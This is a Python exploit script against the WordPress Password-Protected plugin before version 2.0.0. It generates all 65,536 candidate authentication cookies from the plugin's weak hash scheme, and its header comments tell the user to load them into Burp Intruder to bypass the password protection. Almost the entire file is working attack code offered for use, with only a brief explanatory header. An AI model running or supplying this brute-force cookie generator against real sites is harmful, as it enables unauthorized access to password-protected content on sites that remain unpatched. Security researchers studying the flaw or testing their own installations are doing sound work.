#!/usr/bin/env python
# 
# Author: lucyoa <lucyoa[at]reverse-shell.com>
# Wordpress Password-Protected plugin exploit authentication bypass
# vulnerable versions prior to 2.0.0
#
# Script exploits weak hash generation in password-protected plugin which allows
# to generate all possible auth cookies - 65536 values.
# Plug created list to Intruder from BurpSuite and bypass authentication


import hmac, hashlib
import itertools

def main():
  alph = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"]
  expiration = "1437664428"
  site_id = "bid_1"
  for pass_frag in itertools.product(alph, repeat=4):
    pass_frag = "".join(pass_frag)
    key = hashlib.md5(site_id + pass_frag + '|' + expiration).hexdigest()
    hash = hmac.new(key, site_id+'|'+expiration).hexdigest()
    cookie = site_id + '|' + expiration + '|' + hash;
    print cookie

if __name__ == "__main__":
  main()
